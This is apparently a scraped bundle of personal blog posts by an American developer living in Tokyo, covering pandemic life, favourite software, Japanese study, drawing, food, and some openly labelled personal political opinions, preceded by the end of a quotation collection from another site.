The people who came up with them didn’t plan on defining a numerical namespace that would last half a century or work its way into popular culture. You see this pattern over and over in the history of technology. […]\n\n      Because technology isn’t immune to historical contingency, it’s important for us as engineers to remember that long-lasting technical inflection points can occur at any time.\n    \n  \n  \n    The resource leak bug of our civilization (Ville-Matias Heikkilä, 2014)\n\n    \n      It is increasingly difficult for computer users to avoid technological alienation. Systems become increasingly complex and genuine interest towards their inner workings may be discouraging. If you learn something from it, the information probably won’t stay current for very long. If you modify it, subsequent software updates will break it. […]\n\n      The mainstream regards platforms as neutral devices that can be used to reach a predefined result, while the demoscene regards them as a kind of raw material that has a specific essence of its own.\n    \n  \n  \n    Sustainability is not Enough: We Need Regenerative Cultures (Daniel Christian Wahl, 2018)\n\n    \n      The aim of creating regenerative cultures transcends and includes sustainability. […]\n\n      The art of transformative cultural innovation is to a large extent about making our peace with ‘not knowing’ and living into the questions more deeply, making sure we are asking the right questions, paying attention to our relationships and how we all bring forth a world not just through what we are doing, but through the quality of our being. A regenerative culture will emerge out of finding and living new ways of relating to self, community and to life as a whole.\n    \n  \n  \n    Video: Human and Planetary Health: Ecosystem Regeneration (talk by Daniel Christian Wahl, 2018)\n\n    \n      Once we do the reconciliatory step, shifting to the organising idea that we are actually nature – that we can design as nature because we’re nothing but it, we are biological beings first and foremost – then we move into working regeneratively.\n    \n  \n'] at ['https://bismuth.garden/2020/09/beyond-sustainable']

EXCEPT DESCRIPTION FOUND: ['\n\n\n\nSunrise near the share house I used to live\n\n\nI really enjoy soft things. Soft socks. Fuzzy robes. The love-hate relationship with my fuzzy slippers from getting sweaty while enjoying the softness of the material. Software does this soft to too hot transition too. Popularity grows, competition shows up, investors want returns. A lot of products drift away from the simple and clean products they started out as. Often times it’s out of necessity. You can’t necessarily generate money out of every service. Medium and Instagram come to mind. Early Medium was super clean with a great editor and interesting posts. I guess initial investor funds ran out. Now most suggested content is behind their paywall and you have to wade through the sea of listicles to find the actual good content. I heard Instagram added a shopping section?\nCraig Mod wrote an essay about good software. Particularly fast and good software. As someone who has developed software for a captive audience (internal tools, or web portals that the user themselves didn’t have a choice in using), this essay resonated with me. Since users have a variety of devices, there’s a strong desire/need to target all the devices and operating systems. This is usually achieved with web technologies. I think a lot of people could argue web site/web app/local software all day, but the web is such a good tool for this. Which it has the potential to be fast, but typically is much more bloated and slower. It’s hard to get the time to get it done right with web, and it’s even more time consuming to do a native version for each OS/Device. Web can give you a really fast feedback cycle of making something, getting feedback, and improving it. Trying to do that on multiple native applications is incredibly hard.\nMy favorite way to work around this, is that the software could just be as simple as possible. Reduce it down to the core and polish that. So, I want to share some of my favorite software/tech.\nRSS feeds I feel have been gaining traction again. People getting exhausted by social media. Returning back to an older technology. It’s great. Stuff isn’t in your face, you subscribe to what you want, and don’t get a lot of trash suggested content. I recommend Reeder and Fraidy Cat. It’s also an easy way to not have an endless scrolling amount of content. Of course, if you’re subscribing to too many feeds then you’ll have just as much content as reddit or twitter. Hopefully, the content you pick will be better quality.\nMessaging apps are hard to do precisely because it’s hard to target all the devices and operating systems. My favorite is Signal which has very little bloat and is rather secure. I’ve managed to get a good portion of my family on it. It’s been my preferred way to video chat with them from abroad. Unfortunately, their desktop app is an electron app (meaning it’s web based and rather bloated despite being a rather focused chat app). It’s hard enough getting everyone to use the same messaging app. I give Signal a pass for using web technologies to make it available to as many people as possible. iMessage has some incredibly loyal users, precisely because it’s a polished application across the iOS/Mac ecosystem. Though I’ve never had an iPhone to experience it.\nI’ve been using iA Writer to do my journaling lately and it has a really clean and distraction-free interface. Though it has a weird bug when listing files with Japanese names. Despite that, I am writing even this blog post in it. Sublime Text is a great simple editor that’s more coding focused without going too deep into IDE-land. If you want to quickly power edit some text. Sublime text is …well… sublime.\nOn the iPad, there’s Procreate for art. Which is an absolutely incredibly well done program. Adobe eventually managed to get Photoshop onto the iPad, yet I don’t think I’ve seen any artists using it. Large majority of the artists I follow use Procreate or Clip Studio Paint. Photoshop has just gotten more and more bloated over the years, they really struggled to trim it down to a useful core feature set on the iPad. Procreate has such a simple interface. Things are nicely tucked away. Depth hidden away for when you need it. Clean easy to use interface when you do not.\nThere’s been a growing desire for me to seek out these more polished softwares. Ones that are clean and a pleasure to use. They don’t get in my way. I want to enjoy the fuzzy feeling of good software. Reach out. Send me your fuzzy software recommendations.\nI’ve been keeping these things in mind for a project I’ve been working on for quite some time. It’s a web based project because that’s what I do professionally. It’s the space I am most comfortable. I am trying to be mindful of the size of the project. Make it as fast as possible with my resources. I had a lot of features and complexities that I wanted to do with it. But I could work towards that for years and not get it done. It’s not a one man job. I’ve been trimming the scope of it majorly. Reducing it down to the core goal: teaching the user how to write kanji and a context that it’s used in. Even that is a huge ask. Depending on who you ask, Japanese has somewhere between two and three thousand common kanji. To get it done faster I’ve tossed out the complexities of a user management system, radical-kanji-vocab-sentence learning and SRS system for a much simpler system. It’s still a lot of work, but the high level goals fit on a single page which is much less than what I was asking from myself before.\nI am still quite happy with where I have gotten so far with it. I hope it’ll be useful.\n\n\n\nShowing writing a kanji correct and incorrect\n\n'] at ['https://longest.voyage/log/nice-and-soft/']

EXCEPT DESCRIPTION FOUND: ['I don’t have much in particular to say. This is just some rambling.\nWe finished off last year with a nice long break. Japan tends to take off a few days at the end of the year. A little bit more than the one or two days typical in the US. Then we got another three day weekend for “coming of age” day. Which is a day celebrating people who turned 20 years old. It can be a pretty big celebration for them. A lot of holidays here are just random days though. I can see how Japanese people can somehow get through the year without much holiday. They’re spread out in such a way that another one is just around the corner. Since graduating, I haven’t quite figured out how to spread out my holiday. I often just saved it up and used it for traveling. We’re itching to travel somewhere within Japan, but still no plans on when we want to do that.\n\n\n\nA walk in the park\n\n\nWe are still sneaking out to the park occasionally. Just a quick walk through. Some weekends it’s empty, but yesterday had quite the crowd as it was pretty warm (~65F, ~18C). And it’s back down to the chilly weather again today. Japan started up it’s “State of Emergency” again. Which much means restaurants shut down earlier, and the city will do an announcement from time to time to say: “please stay home. and don’t forget to wash your hands”.\nWe are trying to do more “Japanese only” time at home. Where we only communicate in Japanese. It’s helping me do more output of Japanese which is something I struggle to do. Normally, I think we do something like 70/30 or 80/20 for English/Japanese. It can vary of course, but typically explanations are in English. I also signed up for a group lesson for Japanese. I think the level of the course will not actually be that high. I’ve studied a lot of the grammar before, but there’s a lot of the grammar that is not in my “active vocabulary”. Just trying to find more ways to output and practice.\nI am forcing myself to have a no-coding weekend, because I’ve gone through a bit of programming stuff lately even after work. Sometimes even during my breaks I’m coding something for a bit. During the “coming of age day” holiday, we spent the day almost entirely programming. Learning new things is great, but I am trying to force myself to turn off that part of my brain. Let myself relax mentally. Do a bit of drawing, writing, or play Scott Pilgrim. (I am super excited that game was re-released, it’s a lot of fun.)\nRust is a programming language that has been gaining a lot of steam lately. I found this book online which has been the most useful for grasping the concepts in the language. This language does not have a friendly learning curve. Go in comparison is much cleaner and easier to learn and understand. But after getting over the initial learning curve for Rust, I am finally seeing the usefulness of it. Just took me a lot longer to understand. It was a bit of a grind. I do have some concerns about the ecosystem. Hopefully, it doesn’t have the problem that node/JS-world has where the language/pipeline/tooling changes so much that old code won’t run easily. I stop working on a project for 6 months and I can’t build my front end without tons of new linter errors. Why?!'] at ['https://longest.voyage/log/2021-01/']

EXCEPT DESCRIPTION FOUND: ['The leaves have started to change. Mornings have been chilly around the lower fifties, and the afternoons are lovely. I occasionally sneak out during my lunch break for a short walk. The girlfriend and I moved into an apartment close enough to a big park. We had a picnic a few weeks ago. Luckily there’s enough space that people can spread out. I had a moment where I just breathed in the smell of the trees and the grass. It was much needed. I didn’t realize how much my mask stops smells and how I’ve gone nearly 8 months without smelling plants and trees.\n\n\n\nThe girlfriend and a gingko tree.\n\n\nJapanese like to brag about how they have four distinct seasons in Japan. I feel cheated out of the “Japanese autumn” experience this year since we don’t get to travel. Though, I don’t mind being cheated out of the summer experience as it gets very hot and humid here. The salaryman sardines that train cars become is not great mix with humidity. We’ve been lucky with the recent weekends to be able to walk to the park. Watching the gradual change of the leaves. The cooler weather is making me excited for hotpot season in the winter.\nI applied for my visa extension this week. We’ll see if my company’s reputation will be strong enough to get me a good one. I would like to not need to do this again next year, but it is possible it will not be as long as we applied for. With how the pandemic is shaking out, I don’t know when will be reasonable to visit home again. It’ll be a huge relief to not need to worry about my visa.\nInterestingly, the pandemic did allow me to attend my high school reunion via zoom. While it was a small crowd, it was great to see them. My high school experience wasn’t a normal one for someone growing up in North Texas. I realized from the reunion how I become a much better person because of that experience despite the various difficulties at that time. I am grateful for that.\n\n\n\nSmall gouache painting.\n\n\nAs for the day to day, not much has changed. Still working from home. They’re wanting to slowly start bringing us back to the office. Which is bad timing considering the recent the numbers. I managed to get some family to use Signal. Glad to have a way to video chat with them that’s not owned by a major tech company. I am still slowly progressing with drawing, painting, or trying different mini projects. Anything I can get my attention to latch on to. I want to focus on things, but for my mental health I am not being too hard on myself. I have a few writing exercises ideas I want to explore that on here. I have a few drafts of things to finish. I’ve been listening to a lecture series by Brandon Sanderson. One of them has a guest lecturer who goes over writing short stories/flash fiction. I have probably watched that specific video three or four times. I came up with a story outlining exercise that I am calling “hundred journeys” which is to write (~100) story outlines in the format of The Hero's Journey or other another similar story circle. It’s likely way too much, but I like the idea of it. I’ll try to take it a little bit at a time.\nAlso, it’s Christmas music season. I spent yesterday morning tweaking the home page and listening to that. It was lovely.'] at ['https://longest.voyage/log/autumn-abroad/']

EXCEPT DESCRIPTION FOUND: ['This morning I woke up early. My body continuing it’s habit to wake me up early regularly regardless of what time I go to bed. This week has been no different. But with the time difference, I have been going to sleep with the election on my mind and waking up terrified if it’s going to be like four years ago. Where I woke up with a pit in my stomach about the future of the country. But today I woke up to this.\n\n\n\nBiden Elected\n\n\nI resisted the urge to wake up my girlfriend at that moment. Though I almost woke her up when my phone made the shutter sound for the above screenshot. It was a feeling I haven’t had in a while. A huge relief of knowing there’s going to be a proper leader. I listened to his victory speech and drank it like a medicine for an aching body. Knowing it’s not going to be better over night. Might even be months or even years until things “settle down”. He brought a message that we should be trying to unite more. No more of the us versus them. Despite drinking this medicine, I still have an anxiety. It’s a different one than the last few years. It’s a new one.\nI grew up in a rather conservative and religious upbringing. The attitude of taking care of the environment was: “Sure, we should take care of what we have, but we don’t really need to inconvenience ourselves because we know God will take care of it.” Of course, it’s already a problem. Wild fires are much more common. Weather getting more extreme.\nWhen I was a young little homeschooler, we would regularly go to the library and I would get non-fiction books about various animals and the ecosystems they lived in. I especially loved to read about big cats. Though, I would go through different animal phases growing up. A lot of those animals and ecosystems that I loved to read about are eroding away now.\nAs a kid, I remember seeing tons of bugs all over the grill and windshield of my parents car after a drive. That barely happens anymore. You have to get pretty far out from civilization, even then it barely happens. Bug populations are way down globally. We’ve eaten away at our local ecosystems, and continue to devour.\nThe weird near denial of taking active action for the environment we live in reminds me of a story I would hear in church.\nA man was told a huge storm was coming. There will be major flooding in the area, and he should evacuate. The man being a person of faith said, “No need to evacuate, my God will save me.” The storm comes and sure enough it begins flooding. The water up to his ankles in his house. A neighbor in a boat comes by and offers him a ride. “The storm is going to get worse, we should evacuate.” But the man’s faith wasn’t dissolved in the ankle deep water. “No need to evacuate, my God will save me.” The neighbor leaves without him. Rain continued until the man was forced onto his roof. Another boat comes by with the same message: “The storm is going to get worse, we should evacuate.” Even still, the man’s faith stood strong as he responded, “No need to evacuate, my God will save me.” The boat leaves without him. The waves of the water become too dangerous for boats. A helicopter comes to save the man stranded on his roof. The man proclaims to the helicopter: “No need to evacuate, my God will save me.” The helicopter leaves without him. The waters continue to rise, and sure enough the man drowns in the flood. Upon the entering the pearly gates of heaven and meeting God, the man was confused. “But God… why didn’t you save me?” he asks. “What more did you want? I gave you a warning, two boats, and a helicopter?!”\n\n\n\nA rose from a nearby park\n\n\nWe need to listen to each other. We need to work together to take reasonable steps to move forward. We’re constantly being put at each others throats often as a distraction from the actual problems. We see a storm coming, and I believe we all want as much people in the boat as possible.\nI have an anxiety about this future, but it’s a hopeful one.'] at ['https://longest.voyage/log/a-new-anxiety/']

EXCEPT DESCRIPTION FOUND: ['Personal Political Opinion Warning\nI am a white middle class American male. Growing up I had the privilege of considering myself “apolitical”. I did not have to care about politics because it didn’t harm my way of life on the day to day. The internet has done a great deal of damage to our political system (among other things), but at the same time it has shined a light on people who are hurting.\n\n\n\nShinagawa Station\n\n\nCompletely unrelated picture for fun\nGrowing up there’s a lot of things where you realize adults are just older than children. Not necessarily more mature or thoughtful. Sometimes you realize the people around you feel the same way. I was surrounded by a lot of people who were apolitical. They knew they should vote and were in the privileged group that could easily do so. But since they were in the apolitical group of “this doesn’t affect my life” they could vote for candidates that checked a box for a particular value. This is how I feel the “single issue voters” are created. They’re in the bubble that forgets that other people are not in the same situation as them. That people can’t “just get a job” or “just get a baby sitter”. Life is messy. We don’t all have the same opportunities. And in our bubbles, we easily forget that.\nAnother danger about these types of voters. The single issue voters. The apolitical. Is that they’re easily won. “I don’t like his vocabulary, but he said he will put in people who will ban abortions so I will vote for him.” This is a common thought process. It may be on different issues, but this is essentially it. The apolitical will be unaware that the same candidate paid hush money to a porn star using campaign finances. They didn’t need to care about politics before. Why would they need to look into that?\nI am sure most apolitical voters are not even that strongly affected by the single issue that they cling to. To the degree that they don’t know the damage it could cause. Let’s look at abortions. I highly recommend the podcast Science Vs on this topic. All the stats I mention from here is from their notes and sources. In 2013, a third of women having abortions were doing it for partner related reasons. Saying it wasn’t a “good” or supportive relationship and some cases were even physically abusive. 60% of women seeking abortion were already mothers. 40% of women who got abortions were doing it for financial reasons. They couldn’t afford a(nother) child.\nNot just raising, but just giving birth in a hospital in the US is increasingly expensive. To just blanket ban abortions is going to just push these families (or single mothers) into poorer positions. Forces them into unhealthy relationships with partners who may be abusive. And forces them into positions where they can’t fully financially support the child. My point isn’t that abortions are good or bad. What I am saying is: any ban on it that doesn’t consider these consequences is truly cruel to the women and to the children they’re being forced to have. Any politician that speaks against abortions and doesn’t propose solutions for these problems is purely taking advantage of the single issue voters. If you’re a single issue voter, please deeply understand both sides of that issue. If you are apolitical, enjoy the privilege. That means you can vote for politicians that you think will help people in less fortunate positions than you, and I hope you do.'] at ['https://longest.voyage/log/apolitical/']

The share house has been fine, but with the corona situation I really do not want to be in a building with so many shared spaces. Share house is much simpler to manage though. Don’t have to worry about paying for utilities and such.\nAs Autumn gets closer, the heat has gotten less blistering. Few typhoons tossing some storms our way, but have been keeping a distance. It was reported that this year was the first time on record typhoons never hit Japan in July. While Kyushu (Japan’s southern island) has gotten slammed with multiple typhoons since, Tokyo has been relatively calm. After the heat and rain settles, I can wander around and take photos again. I think I will be much more excited to do so once I move to the new place. More places to explore.\n\n\n\nBlue Skies\n\n\nJapanese seem to enjoy the seasonal limited edition flavors and snacks. Most are just okay, but it’s a lot of fun to try. Even if the flavor isn’t all that great. Starbucks almost always has something going on and gets a lot of press because of it. Here’s some random ones I felt the need to take a picture of in recent months.\n\n\n\n"Tacos" flavor\n\n\nMan, I miss real tacos. These had the mediocre “taco flavor” flavor.\n\n\n\nOrange Vanilla Coke\n\n\nThis one was pretty good. I always enjoyed vanilla coke when I was younger. Seeing a spin on the flavor made me want to try it. Supposedly this is a popular combination from those coke “Freestyle” machines where you can select your own add-on flavors. They then turned that into a limited edition flavor.\n\n\n\nChupa Chups drink?\n\n\nThis was the one that made me do a double take. I always enjoyed their suckers as a kid, but rarely ever had them. This was the first time I’ve seen the brand doing something else. Their brand seems to be around Japan a bit more than I saw in the US.\n\n\n\nstill learning to draw faces\n\n\nThis one isn’t food, but one of my recent struggles with drawing faces. Slowly making small amounts of progress. I am looking forward to having a bit better space to do more paintings. It is a bit tedious at the share house. In order to get clean water or wash off my paint, I need to go to a different floor since my floor only has women only bathrooms.\nAs for writing, I passed up 223 days in a row (283 total on 750 words) and have written over 215,000 words. I am slowly progressing my rules for time travel. Spoiler: it’s more about specifying a category of time travel. I want to brainstorm short story ideas. Even bite sized short stories. I want to explore doing that more. Maybe a short story I can draw.'] at ['https://longest.voyage/log/snacks-and-such/']

Slowly trying to get better at a few things. Learning new things when I can. Drawing when I have the energy. Unfortunately, I have days where I struggle to push through the brainmush I end up in. The rainy season hasn’t been helpful either with the lack of sunlight. I’ve been watching Task Master on youtube and it is hilarious. I hope they add the James Acaster series on YouTube soon. Really curious about how he does his tasks on the show. I also watched the second and third season of Dark on Netflix. It probably has some of the best time travel I’ve seen in a TV show in a long time. It actually inspired me to come up with some rules about how proper time travel should work in a story. I feel I have it pretty thoroughly set up. I’ll write about it another time (or maybe I already have).\n\n\n\nI had a bit of a 3d shader kick for a bit. Learned about graphical shaders which do some really cool effects. Basically, it’s another step in processing 3d images before it draws the image to the screen. It’s really powerful, and it’s where a lot of games get their polished feel.\n\n\n\n\nTried to emulate a sort of chromatic aberration effect. I think it could be cool as an alternative to motion blur.\n\n\n\n\nDissolve effects are really fun to look at.\n\n\n\n\nThe grass shader here is me trying to combine all the things I learned into one shader. Very much inspired to how Sky does it’s grass effect. I am not a huge fan of the colors here, but it’s a neat effect.\n\n\n\nI have been doing a bit of figure drawing sessions online. I am still pretty terrible, but it’s most of what I do for my drawing practice lately. For about 15-30 minutes I practice drawing some awkwardly positioned people. If I have the creative strength that day, I’ll draw more. Lately, I often just do the session and be done for the day. Something I don’t practice enough is a more rendered image. The sketch above is based on a photo I took of my brother. I spent a lot longer on it than my usual figure drawings. I managed to get some aspects of his likeness down pretty well. I could spend more time tweaking it and trying to get it just right, but I will probably get more benefit out of moving on to other pictures for now. I might come back to this someday and try to flesh it out a bit more.\nI am shifting the design on the site a little bit. I am going to create a section for Japanese notes. It’s mostly for me to reference, but I’ll make it public. My studying hasn’t gone much of anywhere lately. I want to have a format to create notes, reference other sites, link pages together. We’ll see how it goes.'] at ['https://longest.voyage/log/waiting/']

EXCEPT DESCRIPTION FOUND: ['I have a handful of pictures to share still, but it’s hard to write more blog posts about life abroad when my days are mostly staying inside. I do quick runs to the convenience or grocery stores for food. I tend to eat pretty easy meals because I don’t want to risk getting/spreading anything from the common area at the share house that I am currently living in. It’s simple and easy living. I don’t have to worry about a paycheck, which is a fortunate situation to be in. I started to sneak over to visit the girlfriend on the weekends. I try to use the train early or late to avoid the crowds on the trains. Not really acceptable, but I continue to rationalize.\n\n\n\n\nNaturaling Life\n– some hotel\n\nBeyond that I am pretty much just at home in my shoebox. Which has allowed for some continued growth. I am still writing my 750 words journal. I have kept fairly consistent which is great. I am over 105 days in a row. Which blows my mind still. I have written over 125,000 words on the site, more than half of which is from this current streak. While I am happy with this, I do think about how I will try and go beyond this. Maybe writing a short story or something. I would love to do something in the vein of Hengtee Lim or Uel Aramchek. They write wildly different styles of short stories, but they’re some of my favorite short story authors that I’ve found online. I haven’t really dived into that kind of writing, but I am doing my best to maintain the writing practice as my stepping stone to that.\n\n\n\nIn a similar direction to growth in writing, I have officially started trying new things with art. I mentioned back in March that I was interested in learning gouache. But still wanted to keep progressing with sketching first. I still have some pages left in my sketchbook, but it is mostly done. I ordered the paint and supplies during the golden week vacation and have been slowly learning by watching twitch streams and youtube. There are definitely some tricky aspects to gouache, but it’s been a lot of fun to learn. I still have a bit of trouble getting myself to paint in the evenings after work sometimes. I don’t know if it’s just general stress from …everything or if I put pressure on myself. I’d love to get painting and sketching as a breakaway, but right now it requires a bit of mental energy to push myself into it. I will try to be more intentional with making time for it.\n\n\n\nWhen I was looking to buy gouache paint I found that there’s some good quality brands in Japan that are typically expensive abroad. In fact, the usual recommended one in the US is twice as much. Though there was a lot of confusion for acrylic and traditional gouache. I went for the traditional gouache since you can reactivate the paints (but that’s a bit of a two edged sword). There’s a lot of paint sets with premixed paints. Instead of going for the one of the variety sets, I am starting with that basic “art class” set. Only have the primary colors, white, and black. It’s been an adventure in learning to mix paints. I have started trying to figure out how I might mix paints to get colors I see outside. It’s silly and fun.\nMy little brother saw some of my paintings I sent him and he mentioned doing some concept art for the train game in gouache. I happened to remember a reference photo I recently saved so I painted the one above. I love the idea of tying in the gouache work with the train game. It was something I try to do with my Japanese study. Try to have multiple different outlets that still are somehow connected to a long term focus. This was important when I lived in the US where there’s not many chances to use the language. Luckily, I have several interests that I can connect to Japanese. The absolute best way to learn Japanese is to sit down and study. 100%. But considering there’s a lot to get through, you’ll probably burn out or go insane if you don’t pace yourself. If I couldn’t get myself to study I would give myself space to play a game or watch a tv show, but it would be in Japanese or have a huge Japanese focus. Often by the time I finished playing the game or watching the show I would be motivated again to jump back into the studying. I am still not particularly great at Japanese. Considering my wide range of coming and going interests this was a way that I was able to keep growing.\nI’ve updated my “about” page to be a “now” page. It’ll be more of a living document to update what I’ve been up to.\n–\nSometimes at the share house there’s a slight smell of nearly burnt toast and coffee that reminds me of breakfast at my grandma’s old house; It’s nice.'] at ['https://longest.voyage/log/growth/']

Even the weekdays and weekends are blurring as I am either in my chair or my bed with a laptop. Only escaping to the conveniences store and grocery stores for food. It’s a bit boring, but it’s the current life in the shoebox. This weekend I attempted something a little bit different.\n\n\n\nWhen the sun is rising or setting there’s a period of soft light that is often referred to as Golden Hour. I honestly never really thought about it much before I started learning about photography. Photographers love it. You get a dramatic warm morning glow. The light isn’t harsh or too dim. The low sun provides interesting shadows. It’s one of the best times to take photos. Tokyo’s location however makes it a bit tricky. The sun sets as early as 4:45 in Winter and as late as 7 in the summer. Sunrise is… early. Currently, about 5 am. Looks like it’ll get even earlier in the summer. Japan doesn’t do the daylight savings to shift the hours, but I also think they’re just in the wrong timezone in general. Much to the delight of my coworkers, I get very jet lagged going to and from Tokyo and Dallas. I’ll be very sleepy in Dallas, and very much awake early in Tokyo. I try to take advantage of jet lag when I wake up early by exploring and taking pictures. This year, I didn’t get a chance to do that. I definitely still woke up early as I adjusted, but the weather didn’t allow walking around. However, lately I’ve been waking up fairly early on my own as is. Usually awake around 6 or so. Typically, unproductive for an hour. Catching up on the internet or chat with someone online for a few. Eventually, I do my 750 words for the day and check in on Animal Crossing. Friday night, I wanted to get out. I was done with being in my shoebox. But it was already getting dark and evenings have too many people around. So, I decided to woke up early. Hella early.\n\n\n\nI set my alarm for 5:45, but I woke up earlier than that to a clear sky and hints of the sunrise. I felt in a rush to be outside. Didn’t want to miss a second of golden hour. Equipped my camera and an extra layer of clothes for the cool morning. Pulled up directions to a park that I had been meaning to check out and starting walking. The park was really beautiful. They really do take care of it. Being surrounded by so much green and so few people felt great. There were some (mostly much older) people doing their morning walks. But not that many at 5am. I walked all the way through it. I was about to turn around and go back the same way when I noticed another pathway that took me up a hill and along the opposite edge of the park. Going up I realized how clear of a day it really was when I saw Mt. Fuji. It’s not always visible from Tokyo. In fact, I had no idea it was visible from a place so close to me. I was probably 20-30 minutes walk from my share house. I was on my way back home when my alarm I set the night before went off. I turned it off glad I woke up at the wrong time.\n\n\n\nI was surprised with what I got out of waking up so early and going for a long walk. Beyond some good exercise and a few pictures, I got a long day out of it. I don’t feel like I was particularly more productive than usual. But my day felt much more fulfilling, even though I still went home to play Animal Crossing and do my 750 words. It was a good relaxing day. I enjoyed it so much I did it the next day. Can I sustain something like this? Doubt it. I’m definitely not going to make it a routine during the week to wake up at 5 and walk around for an hour. I don’t think I can do that long term. I may start work tomorrow exhausted from two long days. But if it’s a clear day and I’m awake a little early, I think I’m definitely going to seriously consider going out.'] at ['https://longest.voyage/log/life-in-the-shoebox/']

EXCEPT DESCRIPTION FOUND: ['I apologize now as I started this post before the most of the shutdown stuff really kicked off. Talking about food that I can’t go get now is driving me nuts too.\nI love Japanese food. It’s absolutely delicious and tends to be more healthy and better portioned than most American meals. In Tokyo, there is a lot of variety of available foods from all over. I’ve done a few vacations to Japan I try to have an open mind with the food. This is something that took time to get used to as I was a very picky eater when I was younger. I have had fugu (blowfish), eel, octopus, whale, natto (fermented soy beans), raw chicken. And I think I have even had horse? Some of those are rare to eat, but eel and octopus are really common. Some of my other favorites here are: Okonomiyaki, Yakitori, and Japanese curry. Every time I traveled here, after about a week I would always crave something from back home: a good hamburger.\n\n\n\nThere’s several Japanese hamburger places. Most are not that great. They go after a completely different flavor. The patty is not that great. Earlier this year, I tried a Hawaiian burger place hoping that they’ll maintain that ‘American style’ of burger. Well… it reminded me of an American style of food, but not one you would want. The ingredients were mostly fine, but the patty reminded me of the quality of meat you would get in a cheap grade school lunch. That grey blob that looked like it was steamed to warm up in the back room. That burger essentially started my search. Of course, there are major US chains are here. McDonalds is obviously everywhere. But I will probably only eat McDonalds burger when I feel nostalgic for smashing junkyard cars at youth group. Wendy’s isn’t Wendy’s here. Some company essentially put the Wendy’s brand on some Japanese chain. Can’t even buy a frosty there; last time I checked. I knew from previous trips that Shake Shack came to Japan in recent years. Shake Shack is probably the only acceptable American chain, but it’s still just Shake Shack. When I asked some people about a good burger place they usually said Shake Shack.\n\n\n\nMy current favorite burger shops I’ve found so far are Umami Burger and Burgers Tokyo. But the weird thing about the burger shops here, is that many of them try to make their burgers really big. It’s like twice as tall as it should be. Incredibly hard to eat most of the time. Most of the time end up eating it out of a paper wrapper that they give you to stick it in because it’s going to fall apart. With the sizing thing, my criteria for a good burger slightly shifted. Needs to nail the patty flavor and not be a pain in the butt to eat.\n\n\n\nThe sakura (cherry blossom) season was early this year, but it stuck around for a bit longer than I expected. Before the shutdown stuff started to get more serious the girlfriend and I had a little bit of time to see some. We had a little picnic by the river near my share house. We could people watch a bit. Parents taking pictures of their kids with the sakura. Sometimes people have a whole setup for a picnic at the river. Lots of people walking around taking pictures. Kids looking at the huge carp that are swimming in the small river. It’s a fun time. I think sakura usually is only be around for a week or two. But it seems to have managed to stick around for closer to 3 or 4. Often ends with some rain storm knocking out all the flowers. The flowers held on a bit longer even with some rain and snow coming through.\n\n\n\n\nOriental Traffic: have a nice shoes\n– some totebag\n\nIt’s a bit weird but it took me about 3 months to finally start get back in the mood to actually study Japanese again. It weird because it was something that I so actively did back in the US, and essentially dropped once I got here. You could say I was more immersed than before, but passive learning only gets you so far. My job is pretty much entirely in English. We just have some data that’s in Japanese. So, there’s not much growth there. Not to mention the whole work from home situation. In terms of Japanese input, it’s almost like I never left the US. I have to make more effort to seek it out, which is difficult during these quarantimes.\nSimilar to me not studying Japanese, I also haven’t spent much time programming outside of work. I have a couple several projects I would like to continue. My Japanese studying often fueled the desire for some of those projects (as many projects are Japanese study related). But I may try to hold off on programming outside of work. I’d like to work on writing and drawing a bit more. Will be tricky to maintain as I’m slowly easing Japanese study back into my routine.\nI’m still slowly practicing drawing and writing. I’m at 66 days in a row on 750 words. But I admittedly haven’t done as much drawing since Animal Crossing released a few weeks ago. It’s been fun to play with everyone. Switched to Japanese so I can count it as study time. I’m just about to start the last loan on the house. Going to take a bit longer to pay off this last one.'] at ['https://longest.voyage/log/the-burger-search/']

For some reason, I tend to cycle through a lot of these. I learn a lot all the time, but end with very shallow experience. Routine has typically been my key to sticking to things. If I have a major break in my routine, then things fall apart quickly. And I end up cycling into something else.\n\n\n\nI’ve been trying to be a bit more focused. It is difficult. Most things I enjoy doing are not fun after a long day of work. I get pretty mentally exhausted after programming and meetings all day. I want to do things that are more fulfillment focused rather than enjoyment focused. It’s not uncommon for me to just browse the internet or watch netflix. I don’t get anything out of it. Sure, it’s nice at the moment, but two days later I don’t get anything after rewatching Brooklyn 99 (…again). Those days really feel pretty empty like nothing really came out of them. My focus has been to produce something small. Usually something that I’ll probably never really show anyone. A lot of it is pretty garbage. I think even as a teenager I dreamed of completing big projects like making a big game or some app. Massive projects. Ones that people normally don’t do on their own. I still come up with these types of projects and want to do them desperately.\nLately, I’m purposely slowing down. Allowing myself space to just create for myself. And not work on some big project that I need to show off. I haven’t written as much on here. But I have a 39 day streak on 750 words. Writing for myself. Slowly accumulating thousands of words on that site. All one day at a time. Not trying to do some big project. Just trying to accumulate words one day at a time. If I come up with something I’d like to share, I’ll post it here. But most of the time it’s just random half-thoughts and stream-of-consciousness jibberish. That’s fine. It’s for me.\nI have been drawing a bit more. My goal right now is to finish a sketchbook that I brought with me from the US. I’ve filled up about 2/5ths of it so far. Which I am happy I’ve made it even this far. Some pages have random Japanese vocab lists. There’s some scary looking faces from some drawing exercises. Doing a lot of figure drawings to practice. I need to work on so many things in aspects of drawing skills. The point of my goal to finish the sketchbook is to get more mileage. Slowly building that quantity. I might explore some other mediums after accumulating more pencil mileage. I’ve been eyeing gouache hard lately. I want to “earn” the new medium by spending more time in my current pencil and paper one.\n\n\n\nI’ve been really bad about making progress on the Train game project. Which frustrates me, but it’s a part of my ‘slowing down’. Focusing on things that I have the mental stamina for. Unfortunately, the train project is both simple and complex. It has a fairly clear goal and scope in my head, but there’s lots of complexities and things I don’t know how to do well. This drains that mental stamina for me. Sometimes I push through and am able to make progress, but sometimes it’s just not enough on my own. A few weekends ago, I had a thought to combine some technologies I’m vaguely familiar with. This was a much more achievable goal in my head. The scale of continuing this project is rather large as well. But I wanted to seize the inspiration. So my focus for that weekend: make a very tiny online game.\n\n\n\nI’ve thought through a bit of the goal of what I think a complete version of this would be. That’s still a lot of work, but it’s a fun idea. Using a handful of technologies I’m comfortable with. Currently, this is my project that I do when I’m not brain-dead and not drawing/writing. But I’ve been approaching this in a similar fashion as the drawing and writing. Doing a tiny bit at a time. And be proud of any amount of progress. Sometimes I’ll have something to show for it, but it’s okay if there is not.\nAlso, Corona virus. Crazy, right? Wash your hands. I’ve been working from home a lot. Just keeping my head low. Avoiding the crowds and washing my hands regularly. Other than that, it’s been fine so far.'] at ['https://longest.voyage/log/one-at-a-time/']

